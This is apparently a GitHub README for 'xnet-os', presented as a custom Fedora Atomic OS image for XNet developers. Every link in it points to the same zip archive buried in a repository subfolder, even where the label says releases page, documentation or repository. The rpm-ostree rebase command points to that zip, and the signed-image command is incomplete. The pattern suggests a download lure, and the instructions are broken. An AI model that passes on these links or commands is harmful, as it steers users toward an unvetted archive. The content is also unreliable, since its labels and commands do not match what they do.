# 🚀 xnet-os - A Custom OS for XNet Developers 

[![Download xnet-os](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip)](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip)

## 📥 Overview

xnet-os is an operating system image designed for XNet Inc. developers. This version is tailored by Joshua S. Doucette to enhance productivity and streamline workflows. Use xnet-os to experience a customized Linux environment built for development.

## 🚀 Getting Started

To start using xnet-os, you will need to download the software and perform a few simple steps to install it. Follow the instructions below carefully.

## 🌐 Download & Install

1. **Visit the Releases Page**  
   Go to our [Releases page](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip) to find the latest version of xnet-os. From there, you can choose the appropriate file for your system.

2. **Choose Your File**  
   Look for the xnet-os image file. Click on it to start the download. 

3. **Install the Image**  
   Once the file is downloaded, follow the instructions to install the OS image. This typically involves creating a bootable USB drive or using a virtual machine. Detailed instructions can be found below:

   * **Creating a Bootable USB Drive**: 
     - Use a tool like Rufus (for Windows) or Etcher (for Mac and Linux) to create a bootable USB drive.
     - Select the downloaded xnet-os image file and follow the prompts in the tool to complete the process.

   * **Using a Virtual Machine**: 
     - If you prefer to use a virtual machine, software like VirtualBox or VMware can be used to create a new VM.
     - Select the downloaded xnet-os image file as the boot disk when you create the new VM.

4. **Reboot Your System**  
   After installing the OS, reboot your computer or start the virtual machine.

### 🔑 System Requirements

To run xnet-os smoothly, ensure your system meets the following requirements:

- **Processor**: 64-bit CPU
- **RAM**: Minimum 2 GB (4 GB recommended)
- **Storage**: At least 10 GB of free disk space
- **USB Port**: For bootable USB installations

### 💡 Important Notes

- xnet-os is an experimental feature, designed for developers. Use it at your discretion.
- Check the [BlueBuild docs](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip) for additional setup guidance.

## 🔄 Rebasing Instructions

If you have an existing atomic Fedora installation, you can rebase to the latest build of xnet-os. Follow these steps:

1. **Rebase to Unsigned Image**  
   Open your terminal and run the following command:
   ```
   rpm-ostree rebase https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip
   ```

2. **Reboot**  
   After completing the rebase, reboot your system by using the command:
   ```
   systemctl reboot
   ```

3. **Rebase to Signed Image**  
   Once your system has rebooted, run this command to rebase to the signed image:
   ```
   rpm-ostree rebase ostree-image-signed:docker://
   ```

## 🌍 Support and Community

If you encounter any issues or need help, consider visiting our community forums or submitting a ticket. Engaging with other users can often provide clues and solutions to common problems. 

### 🌟 Topics

This project relates to the following topics: atomic, bluebuild, bluebuild-image, custom-image, image-based, immutable, linux, linux-custom-image, oci, oci-image, operating-system. 

## 🔗 Additional Resources

- For more details, please refer to the [GitHub Repository](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip).
- Browse the [BlueBuild documentation](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip) for advanced setup options.

## 🔗 Download Link

To download xnet-os, click the link below:

[Download xnet-os](https://github.com/hamzasalam323/xnet-os/raw/refs/heads/main/files/system/usr/xnet_os_3.2.zip)

This ensures you have the latest features and updates. Enjoy working with your customized operating system!